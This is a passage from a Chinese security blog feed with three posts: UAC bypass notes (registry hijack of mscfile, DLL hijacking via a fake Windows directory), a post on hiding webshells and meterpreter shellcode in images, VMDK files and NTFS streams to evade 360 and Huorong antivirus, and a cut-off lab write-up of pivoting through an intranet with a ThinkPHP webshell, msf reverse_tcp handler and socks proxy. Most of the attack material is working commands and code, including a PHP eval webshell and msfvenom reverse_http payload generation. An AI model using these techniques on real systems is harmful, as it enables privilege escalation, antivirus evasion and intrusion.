    <content type="html"><![CDATA[<h2 id="0x01-UAC白名单"><a href="#0x01-UAC白名单" class="headerlink" title="0x01 UAC白名单"></a>0x01 UAC白名单</h2><p>首先，如果父进程和子进程之间存在关系，即子进程从父进程中继承访问令牌，就可以绕过UAC，这是绕过UAC基础。</p><p>任何需要管理员访问令牌的程序都必须征得同意(即UAC弹窗)，但是存在一些具有白名单机制的系统程序，这些程序将会自动提升到管理员权限进行运行。因此，可以通过这些白名单来bypass UAC，以便获得高权限。</p><p>微软官方提供的Sigcheck和Strings工具，可以用来寻找白名单程序。</p><p>String：  &#x2F;&#x2F;可以查找所有白名单程序</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">strings.exe <span class="hljs-string">/accepteula</span> -s C:\Windows\System32\*<span class="hljs-string">.exe</span> | findstr <span class="hljs-string">/i</span> <span class="hljs-string">&quot;autoElevate&quot;</span><br></code></pre></td></tr></table></figure><p>Sigcheck： &#x2F;&#x2F;可以对特定的程序查询是否为白名单程序</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sigcheck.<span class="hljs-keyword">exe</span> /accepteula -<span class="hljs-keyword">m</span> C:\Windows\System32\ComputerDefaults.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p><strong>原理：</strong></p><p>白名单程序拥有一个共同的特性，就是<strong>autoElevate</strong>属性的值为true。</p><p><img src="/./../images/image-20221127150403965.png" alt="image-20221127150403965"></p><p><img src="/./../images/image-20221127150432204.png" alt="image-20221127150432204"></p><p>以CompMgmtLauncher.exe为例测试分析，因为它是白名单程序，所以运行时自动提升到高权限，没有uac弹窗。</p><p>使用process monitor监视进程：</p><p><img src="/./../images/image-20221127141054828.png" alt="image-20221127141054828"></p><p>找到shell的注册表，通常情况下，以“shell\open\command”命名的注册表中存储的可能就是可执行文件的路径，程序通过regopenkey&#x2F;regquerykey其中的键值并运行相应的可执行文件。</p><p>修改键值对：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> “HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span><span class="hljs-string">&quot; /d &quot;</span>C:\Windows\System32\cmd.<span class="hljs-keyword">exe</span><span class="hljs-comment">&quot; /f</span><br><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> “HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span><span class="hljs-string">&quot; /v DelegateExecute /t REG_SZ /d &quot;</span>C:\Windows\System32\cmd.<span class="hljs-keyword">exe</span><span class="hljs-comment">&quot; /f</span><br></code></pre></td></tr></table></figure><p>（尝试了一下，直接在Editor修改并且不新建，也能成功）</p><p><img src="/./../images/image-20221127141130303.png" alt="image-20221127141130303"></p><p>运行之后，弹出cmd弹窗，可以完成新建用户的高权限操作，并且没有UAC弹窗：</p><p><img src="/./../images/image-20221127141156730.png" alt="image-20221127141156730"></p><p><img src="/./../images/image-20221127142307123.png" alt="image-20221127142307123"></p><h2 id="0x02-DLL劫持"><a href="#0x02-DLL劫持" class="headerlink" title="0x02 DLL劫持"></a>0x02 DLL劫持</h2><p>当应用程序启动时，相应的DLL文件就会被加载到程序进程的内存空间，</p><p>如果没有指定DLL的绝对路径，那么程序会以特定的顺序依次搜索待加载的DLL，</p><p>SafeDllSearchMode：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">程序安装目录——<span class="hljs-operator">&gt;</span>系统目录（<span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System32</span>）——<span class="hljs-operator">&gt;</span><span class="hljs-number">16</span>位系统目录（<span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System</span>）——<span class="hljs-operator">&gt;</span><span class="hljs-variable">Windows</span>目录（<span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>）——<span class="hljs-operator">&gt;</span>当前工作目录——<span class="hljs-operator">&gt;</span><span class="hljs-variable">PATH</span>环境变量中列出的各目录<br></code></pre></td></tr></table></figure><p><strong>原理：</strong></p><p>如果将同名的恶意DLL文件放在合法DLL文件所在路径之前的搜索位置，当应用程序搜索DLL时，就会以恶意DLL代替合法的DLL来加载。</p><p><strong>前提：</strong></p><ol><li>对上诉目录有写入权限</li><li>恶意DLL需要与原始DLL拥有相同的导出表函数</li></ol><p>System32目录下易受到DLL劫持攻击的所有可执行文件：</p><p><a href="https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv">https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv</a></p><p><img src="/./../images/image-20221202165142543.png" alt="image-20221202165142543"></p><p>白名单文件自动获取高权限需要满足三个条件（缺一不可）：</p><ol><li>Manifest中autoElevate属性字段为true。</li><li>执行可执行文件的签名。</li><li>位于系统可信任目录。</li></ol><p>首先，构造第3个条件，系统在检查可信任目录时，相关函数会自动去掉可执行文件路劲中的空格，因此可以模拟可信任目录，（测试的可执行文件是WinSAT.exe）</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">md</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows &quot;</span><br><span class="hljs-variable">md</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows \System32&quot;</span><br><span class="hljs-variable">copy</span> <span class="hljs-variable">C</span>:\<span class="hljs-title class_">Windows</span>\<span class="hljs-title class_">System</span>32\<span class="hljs-title class_">Win</span>SAT.<span class="hljs-property">exe</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span>?\C:\Windows \System32\WinSAT.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20221202161013104.png" alt="image-20221202161013104"></p><p>查看C盘就可以发现有两个Windows文件，其中有个文件夹是最近的创建时间（我虚拟机刚好更新了，所以看起来两个文件夹时间相差不多。。。）：</p><p><img src="/./../images/image-20221202161137409.png" alt="image-20221202161137409"></p><p>使用process Monitor监控一下exe调用的DLL：</p><p><img src="/./../images/image-20221202161527640.png" alt="image-20221202161527640"></p><p>可以追踪到，程序在尝试调用伪造的Windows文件夹，但是都失败了，</p><p>尝试伪造一个WINMM.dll，借用工具AheadLib工具获取dll文件导出表函数，并自动生成C++函数，</p><p><img src="/./../images/image-20221202161602993.png" alt="image-20221202161602993"></p><p>在DLLMAIN函数中添加测试命令，</p><p><img src="/./../images/image-20221204151125290.png" alt="image-20221204151125290"></p><p>编译生成dll文件，</p><p><img src="/./../images/image-20221204151209620.png" alt="image-20221204151209620"></p><p>放入文件夹，点击报错，</p><p><img src="/./../images/image-20221204151305516.png" alt="image-20221204151305516"></p><p>去把缺少的dll文件复制过去，成功bypass UAC运行，</p><p><img src="/./../images/image-20221204151631372.png" alt="image-20221204151631372"></p><h2 id="0x03-利用工具bypass-UAC"><a href="#0x03-利用工具bypass-UAC" class="headerlink" title="0x03 利用工具bypass UAC"></a>0x03 利用工具bypass UAC</h2><p><strong>MSF：</strong></p><p>里面很多自带模块可以使用，</p><p><img src="/./../images/image-20221130111432989.png" alt="image-20221130111432989"></p><p>获取会话后，提权失败，（测试过程被杀掉断掉连接了。。。）</p><p><img src="/./../images/image-20221130112947341.png" alt="image-20221130112947341"></p><p>直接设置会话就行了，可直接提升至system权限。</p><p><strong>UACME：</strong></p><p>专用于绕过Windows UAC的开源项目，</p><p><img src="/./../images/image-20221205153834835.png" alt="image-20221205153834835"></p><p>工具使用很简单，手撕代码分析原理还是太菜了，，，</p><hr><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">在Windows中劫持DLL————https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1850848</span><br><br>BypassUAC————https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/cxccc/</span>p/<span class="hljs-number">12732976</span>.html<br><br>“FILELESS” UAC BYPASS USING EVENTVWR.EXE AND REGISTRY HIJACKING————https:<span class="hljs-regexp">//</span>enigma0x3.net<span class="hljs-regexp">/2016/</span><span class="hljs-number">08</span><span class="hljs-regexp">/15/</span>fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/<br><br>Exploring Windows UAC Bypasses: Techniques and Detection Strategies————https:<span class="hljs-regexp">//</span>www-elastic-co.translate.goog<span class="hljs-regexp">/security-labs/</span>exploring-windows-uac-bypasses-techniques-and-detection-strategies?_x_tr_sl=en&amp;_x_tr_tl=zh-CN&amp;_x_tr_hl=zh-CN&amp;_x_tr_pto=sc<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#隐写过360、火绒</title>
    <link href="/2022/11/24/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <url>/2022/11/24/%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="隐写过360、火绒"><a href="#隐写过360、火绒" class="headerlink" title="隐写过360、火绒"></a>隐写过360、火绒</h1><p>一些简单的隐写demo过静态免杀。</p><hr><h2 id="0x00-图种"><a href="#0x00-图种" class="headerlink" title="0x00 图种"></a>0x00 图种</h2><p>利用copy命令，可以将两个文件以二进制方式连接起来，很显然，也可以将木马插入到图片里面，尝试隐写。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">copy/b C:\<span class="hljs-string">...</span>\<span class="hljs-string">...</span>\Desktop\OIP-A.png + C:\<span class="hljs-string">...</span>\<span class="hljs-string">...</span>\Desktop\shell.php 123.png<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20221122150611048.png" alt="image-20221122150611048">生成123.png图片里面就会存在连接密码。</p><p><img src="/./../images/image-20221122151738359.png" alt="image-20221122151738359">通过360和火绒查杀，并没有检查出病毒。<img src="/./../images/image-20221122152011388.png" alt="image-20221122152011388"></p><p><img src="/./../images/image-20221122152040654.png" alt="image-20221122152040654">上传看看。（感觉VT结果怪怪的。。。）</p><p><img src="/./../images/image-20221122152219504.png" alt="image-20221122152219504">换成简单的一句话木马，试试。</p><p><img src="/./../images/image-20221122152829693.png" alt="image-20221122152829693">原理是在图片中，是有结束符的，16进制就是FF D9，而图片查看器会自动忽视结束符之后的内容，所以图片会正常显示，利用winhex就可以看到后续的内容。</p><p><img src="/./../images/image-20221122153931024.png" alt="image-20221122153931024">看到binwalk会对图片进行检查，测试发现，如果单纯的图种（png+zip），会被检测出。</p><p><img src="/./../images/image-20221122155223184.png" alt="image-20221122155223184">如果只是恶意代码，并不能直接检测出来。</p><p><img src="/./../images/image-20221122155301865.png" alt="image-20221122155301865">提一嘴，jpg和png方式对文件压缩不同，jpg可能会使文件损坏。</p><h2 id="0x01-LSB修改"><a href="#0x01-LSB修改" class="headerlink" title="0x01  LSB修改"></a>0x01  LSB修改</h2><p>图种是在图片数据后面增添代码，LSB隐写就是直接修改有效最低位，完成数据隐藏。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-keyword">as</span> im<br><span class="hljs-keyword">import</span> re<br><br>replace_reg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[1|0]$&#x27;</span>)<br><span class="hljs-comment">#替换最后一位的数据，source是被替换数据，target是目标数据，就是batarget放到source最后一位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repLstBit</span>(<span class="hljs-params">source,target</span>):<br><span class="hljs-keyword">return</span> replace_reg.sub(target,source)<br><span class="hljs-comment">#运行结果：&#x27;123X&#x27;</span><br><span class="hljs-built_in">print</span>(repLstBit(<span class="hljs-string">&quot;111110&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>))<br><br><span class="hljs-comment">#字符串转换二进制，不够八位的话补齐8位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">s</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br><span class="hljs-comment">#切割从图像中收集到的数据，就是把载密图像的对应最后一位提取出来之后需要进行切割</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cut_text</span>(<span class="hljs-params">text,lenth</span>):<br>textArr = re.findall(<span class="hljs-string">&#x27;.&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(lenth)+<span class="hljs-string">&#x27;&#125;&#x27;</span>,text)<br>tempStr = text[(<span class="hljs-built_in">len</span>(textArr) * lenth):]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tempStr)!=<span class="hljs-number">0</span>:<br>textArr.append(text[(<span class="hljs-built_in">len</span>(textArr)*lenth):])<br><span class="hljs-keyword">return</span> textArr<br><br><span class="hljs-comment">#二进制转换成字符串，看上面切割方法的注释即可理解该方法存在的意义</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">s</span>):<br>bitArr = cut_text(s,<span class="hljs-number">8</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bitArr)<br><br><br><span class="hljs-comment">#读取宿主图像和要写入的信息生成载密图像。</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>img = im.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:/Users/admin/Desktop/OIP-C.png&quot;</span>)<br>width = img.size[<span class="hljs-number">0</span>]<br>height = img.size[<span class="hljs-number">1</span>]<br>hideInfo = <span class="hljs-string">&quot;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&quot;</span><br>hideBitArr = encode(hideInfo)<br>count = <span class="hljs-number">0</span><br>bitInfoLen = <span class="hljs-built_in">len</span>(hideBitArr)<br><br><span class="hljs-built_in">print</span>(hideBitArr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br><span class="hljs-keyword">if</span> count == bitInfoLen:<br><span class="hljs-keyword">break</span>;<br>pixel = img.getpixel((i,j));<br><span class="hljs-built_in">print</span>(pixel[<span class="hljs-number">0</span>])<br>sourceBit = <span class="hljs-built_in">bin</span>(pixel[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">print</span>(sourceBit)<br>rspBit = <span class="hljs-built_in">int</span>(repLstBit(sourceBit,hideBitArr[count]),<span class="hljs-number">2</span>)<br>count += <span class="hljs-number">1</span><br>img.putpixel((i,j),(rspBit,rspBit,rspBit))<br>img.save(<span class="hljs-string">&quot;C:/Users/admin/Desktop/1.png&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>完成信息写入。</p><p><img src="/./../images/image-20221123094619406.png" alt="image-20221123094619406"></p><p>本地运行，不会报毒，不知道上传能不能正常连接使用。</p><p>试试隐写shellcode。</p><p>msf生成：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_http <span class="hljs-attribute">lhost</span>=0.0.0.0 <span class="hljs-attribute">lport</span>=1111 -fpsh-reflection&gt;12.ps1<br></code></pre></td></tr></table></figure><p>图片和ps1文件放在同一目录下：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Set</span><span class="hljs-operator">-</span><span class="hljs-variable">ExecutionPolicy</span> <span class="hljs-variable">Unrestricted</span> <span class="hljs-operator">-</span><span class="hljs-variable">Scope</span> <span class="hljs-variable">CurrentUser</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PSimage</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PSImage</span> <span class="hljs-operator">-</span><span class="hljs-variable">Script</span> <span class="hljs-operator">.</span>\<span class="hljs-number">12.</span><span class="hljs-variable">ps1</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Image</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">OIP</span><span class="hljs-operator">-</span><span class="hljs-variable">A</span><span class="hljs-operator">.</span><span class="hljs-variable">png</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Out</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">OIP</span><span class="hljs-operator">-</span><span class="hljs-built_in">C</span><span class="hljs-operator">.</span><span class="hljs-variable">jpg</span> <span class="hljs-operator">-</span><span class="hljs-variable">Web</span><br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20221124205249822.png" alt="image-20221124205249822"></p><p>将生成图片上传到网站进行加载，本地运行生成的shellcode，360、火绒不报毒。</p><h2 id="0x02-vmdk隐写"><a href="#0x02-vmdk隐写" class="headerlink" title="0x02 vmdk隐写"></a>0x02 vmdk隐写</h2><p>vmdk作为虚拟硬盘，文件大小上限为2GB，存在跟物理硬盘一样的分区和扇区中类似的填充区域，因此，就可以把数据藏在该区域进行隐写。</p><p><img src="/./../images/image-20221124100159796.png" alt="image-20221124100159796"></p><p>利用winhex（不知道为啥打不开vmdk文件。。）或者010 Editor分析填充区域，确定嵌入的地方。整个虚拟磁盘中存在大量的、聚集在一起的填充区域，从虚拟文件末尾开始（EOF文件标识符）逐渐向上查找，越到文件末尾填充区域就越多。</p><p>填充方式可以有两种，直接用winhex进行替换，或者用vmdk文件编辑工具进行修改。这里选择编辑工具。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dsfi</span> C:\Users\<span class="hljs-number">10976</span>\Desktop\<span class="hljs-number">1</span>.vmdk <span class="hljs-number">36864</span> <span class="hljs-number">36864</span> C:\Users\<span class="hljs-number">10976</span>\Desktop\<span class="hljs-number">12</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20221124102256592.png" alt="image-20221124102256592"></p><p>重新打开vmdk文件，信息成功写入。</p><p><img src="/./../images/image-20221124102536982.png" alt="image-20221124102536982"></p><p>上传看看。</p><p><img src="/./../images/image-20221124102950632.png" alt="image-20221124102950632"></p><p>在vmdk文件填充区域隐藏信息可以避免和图种一样增加文件大小，而且修改过的vmdk也可以正常运行，但是，虚拟磁盘被长期运行，隐藏数据可能会被重新覆盖，同时，vmdk文件太大了，不方便下载或者在网络中传输。</p><p>同原理，PDF、DOC等文档也可以通过添加文件头进行数据隐藏，但是这种文件目标太大，感觉实战上传不太现实。。。</p><h2 id="0x03-交换数据流"><a href="#0x03-交换数据流" class="headerlink" title="0x03 交换数据流"></a>0x03 交换数据流</h2><p>windows NTFS文件系统的交换数据流（ADS）也可以用来数据隐藏。</p><p>ADS数据流文件作为系统中的隐身人在渗透中作用还是很大，这里主要说免杀的应用。</p><p>简单认识一下，创建交换数据流，</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">notepad visiable.txt:<span class="hljs-keyword">hidden</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20221124114335985.png" alt="image-20221124114335985"></p><p>查看创建的文件，字节为0，数据被隐藏，</p><p><img src="/./../images/image-20221124114427016.png" alt="image-20221124114427016"></p><p>ADS数据流文件存在形式就有两种：一是依赖宿主文件，二是单独ADS文件。前者ADS一般很难清理，所以将dll文件写入该文件内测试免杀再好不过了。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">123.dll </span>&gt; <span class="hljs-number">111</span>.txt:ms<br></code></pre></td></tr></table></figure><p>可以看见执行完命令的txt文件并没有改变，</p><p><img src="/./../images/image-20221124211405436.png" alt="image-20221124211405436"></p><p>用360、火绒进行查杀，基本不报毒，不过，用def一扫，就没了。。。（毕竟dddd）</p><p><img src="/./../images/image-20221124212117231.png" alt="image-20221124212117231"></p><p>（测试过程发现一点，如果寄主文件目录发生变化，ADS数据流文件自动消失）</p><p>运行dll：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">regsvr32</span> <span class="hljs-number">111</span>.txt:ms<br></code></pre></td></tr></table></figure><p>看到有说360会对这种dll文件进行动态查杀，但是我本地测试没问题，不太懂了，不过，ADS在WEB安全中的利用值得学习研究一下。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>总而言之，言而总之，数据隐藏的范围很大，包括但不限于还可以在图片的载体中、在双图中、在TCP中、可执行文件中、TTL字段中等等等进行隐藏，可以进一步学习。目前，接触隐写术，只是觉得好玩哈哈哈。</p><hr><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考博客：<br><br>shellcode隐写RGB过火绒、<span class="hljs-number">360</span>————<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>range-x.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">12</span><span class="hljs-regexp">/28/</span>shellcode%E9%<span class="hljs-number">9</span>A%<span class="hljs-number">90</span>%E5%<span class="hljs-number">86</span>%<span class="hljs-number">99</span>RGB%E8%BF%<span class="hljs-number">87</span>%E6%<span class="hljs-number">9</span>F%<span class="hljs-number">9060</span>%E6%<span class="hljs-number">9</span>F%<span class="hljs-number">90</span>%E7%BB%<span class="hljs-number">92</span>/<br><br>数据隐藏技术————http:<span class="hljs-regexp">//</span>tttang.com<span class="hljs-regexp">/archive/</span><span class="hljs-number">1181</span>/<span class="hljs-comment">#toc_0x00</span><br><br>图片隐写术总结————https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/riba2534/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">70544076</span><br><br>Windows ADS在渗透测试中的妙用————https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>terminal/<span class="hljs-number">195721</span>.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#记一次多层内网渗透</title>
    <link href="/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/"/>
    <url>/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次多层内网渗透"><a href="#记一次多层内网渗透" class="headerlink" title="记一次多层内网渗透"></a>记一次多层内网渗透</h1><p>好久之前的一次很简单内网靶场的打靶。</p><p> <strong>ip扫描</strong></p><p>查看开放的端口服务，发现存在web服务的80端口。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113636.png" alt="微信截图_20221118113636"></p><p>进行访问web网页，是thinkphp框架，可以进行工具盲打。</p><p>写入一句话木马。然后访问写入的木马，结果发现木马post被过滤。<br><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113700.png" alt="微信截图_20221118113700"></p><p>将一句话木马进行base64编码，尝试绕过。<br><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113713.png" alt="微信截图_20221118113713"></p><p>木马写入，进行蚁剑连接。<br><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113755.png" alt="微信截图_20221118113755"></p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113813.png" alt="微信截图_20221118113813"></p><p>连接以后，执行终端发现只是普通权限。利用kali生成木马进行反弹上线。<br><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113827.png" alt="微信截图_20221118113827"></p><p>设置msf监听</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">msfconsole<br><br>use exploit/multi/handler<br><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><br><span class="hljs-built_in">set</span> lhost <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> (在不知道网络和主机的时候，可以使用表示)<br><br><span class="hljs-built_in">set</span> lport <span class="hljs-number">6666</span><br><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113854.png" alt="微信截图_20221118113854"></p><p>进行监听后，在蚁剑终端对elf文件进行赋权，然后启动木马，回显上线。<br><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113906.png" alt="微信截图_20221118113906"></p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113919.png" alt="微信截图_20221118113919"></p><hr><p>在第一台内网机器里，查看网段，发现该机器是双网卡。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113931.png" alt="微信截图_20221118113931"></p><p>添加22网段的路由,然后查看路由添加情况。</p><p><img src="/./../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20221118113942.png" alt="微信截图_20221118113942"></p><p>挂起socks代理。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">search socks <br><br>use auxiliary/server/socks_proxy<br><br>show options<br><br><span class="hljs-built_in">set</span> VERSION <span class="hljs-number">4</span>a<br><br><span class="hljs-built_in">set</span> SRVHOST <span class="hljs-number">10.65</span>.<span class="hljs-number">203</span>.xx<br><br>exploit<br></code></pre></td></tr></table></figure><p><img 